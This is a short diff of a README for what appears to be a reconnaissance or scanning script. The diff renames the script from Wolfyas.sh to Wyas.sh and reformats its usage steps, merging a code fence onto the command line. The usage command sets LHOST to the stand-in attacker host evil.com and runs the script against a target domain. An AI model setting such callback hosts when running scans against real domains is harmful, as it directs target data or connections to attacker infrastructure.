@@ -78,13 +78,11 @@ dirsearch
 
 2. Make the script executable:
    ```sh
-   chmod +x Wolfyas.sh
+   chmod +x Wyas.sh
    ```
 
 3. Run the script with the target domain:
-   ```sh
-  LHOST="http://evil.com" ./Wolfyas.sh example.com
-
+   ```sh  LHOST="http://evil.com" ./Wyas.sh example.com
    ```
 
    Replace `<target>` with the domain you want to scan.
